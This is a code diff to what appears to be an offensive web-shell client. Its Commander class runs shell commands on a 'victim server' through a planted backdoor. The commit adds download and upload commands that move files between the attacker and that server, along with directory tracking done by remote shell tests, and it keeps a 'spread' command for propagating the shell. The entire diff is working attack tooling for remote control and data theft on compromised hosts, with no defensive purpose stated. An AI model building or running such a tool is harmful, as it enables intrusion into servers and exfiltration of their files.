Add download/upload methods

+++ executer.py
@@ -17,6 +17,7 @@ class Commander(object):
     Class to execute commands on the victim server
     '''
     def BackConnect(self):
+        self.cwd = serverinfo.source[3]
         i = 1
         # empty list to save attacker's pushed commands
         history = []
@@ -26,8 +27,8 @@ class Commander(object):
                     # getting command to be executed from the user
                     command = raw_input('{user}{red}@{end}{green}{host_ip}{end}:~{yellow}({cwd}){end}-$ '.format(user=serverinfo.source[0],
                         red=Colors.RED, green=Colors.GREEN, yellow=Colors.YELLOW, end=Colors.END,
-                        host_ip=serverinfo.source[4],
-                        cwd=serverinfo.source[3]))
+                        host_ip=serverinfo.source[5],
+                        cwd=self.cwd))
                 # if something went wrong screw the list
                 except IndexError:
                     command = raw_input('icommand@server:$ ')
@@ -64,31 +65,70 @@ class Commander(object):
                     elif command == 'spread':
                         serverinfo.spread_shell()
 
-                    else:
-                        # setting aliases for some commands to avoid
-                        # issues realted to empty directories
-                        command = command.replace('ls', 'ls -lha')
-                        command = command.replace('rm', 'rm -v')
-                        request_type.cmd = command
-
-                        # get the source code cotenets
-                        source = request_type.get_page_source().read()
-                        if source:
-                            print source.rstrip()
-
-                        # if the executed command doesn't exist
+                    elif command.startswith('download'):
+                        if len(command.split()) != 3:
+                            print '\n[!] Usage: download remote_file_path local_file_path'
                         else:
-                            print '{}: command not found'.format(unquote(command))
+                            rfile_path = command.split()[1]
+                            lfile_path = command.split()[2]
+                            serverinfo.download_file(rfile_path, lfile_path)
+
+                    elif command.startswith('upload'):
+                        if len(command.split()) != 3:
+                            print '\n[!] Usage: upload local_file_path remote_file_path'
+                        else:
+                            lfile_path = command.split()[1]
+                            rfile_path = command.split()[2]
+                            serverinfo.upload_file(lfile_path, rfile_path)
+
+                    else:
+                        cwd = self.cwd
+                        if command.split()[0] == 'cd' and len(command.split()) > 1:
+                            if '../' in command.split()[-1] or '..' in command.split()[-1]:
+                                self.cwd = cwd.rstrip(cwd.split('/').pop()).rstrip('/')
+                            else:
+                                if command.split()[-1].startswith('/'):
+                                    request_type.cmd = '[ -d {0} ] && echo is_valid'.format(command.split()[-1])
+                                    if request_type.get_page_source().read().strip() == 'is_valid':
+                                        self.cwd = command.split()[-1]
+                                    else:
+                                        print 'bash: cd: {}: No such file or directory'.format(command.split()[01])
+                                else:
+                                    request_type.cmd = '[ -d {0}/{1} ] && echo is_valid'.format(cwd, command.split()[-1])
+                                    if request_type.get_page_source().read().strip() == 'is_valid':
+                                        self.cwd = '{0}/{1}'.format(cwd, command.split()[-1])
+                                    else:
+                                        print 'bash: cd: {0}: No such file or directory'.format(command.split()[-1])
+
+                        elif command.split()[0] == 'cd' and len(command.split()) == 1:
+                            self.cwd = serverinfo.source[3]  # dirty patch
+
+                        else:
+                            # setting aliases for some commands to avoid
+                            # issues realted to empty directories
+                            command = command.replace('ls', 'ls -lha')
+                            command = command.replace('rm', 'rm -v')
+                            command = command.replace('ifconfig', '/sbin/ifconfig')
+                            request_type.cmd = 'cd {0};{1}'.format(self.cwd, command)
+
+                            # get the source code cotenets
+                            source = request_type.get_page_source().read()
+                            if source:
+                                print source.rstrip()
+
+                            # if the executed command doesn't exist
+                            else:
+                                print '{}: command not found'.format(unquote(command))
 
                 # exist icommand if user provides exit as a command
                 else:
-                    print '\n\n[+] Preformed {} commands on the server.\n[!] Connection closed ..'.format(i)
-                    exit(1)
+                    print '\n[+] Preformed {} commands on the server.\n[!] Connection closed ..'.format(i)
+                    break
 
             # exit icommand if it recieved a ^c
             except KeyboardInterrupt:
                 print '\n\n[+] Preformed {} commands on the server.\n[!] Connection closed ..'.format(i)
-                exit(1)
+                break
             i += 1
 
 # taking an instance from the main class
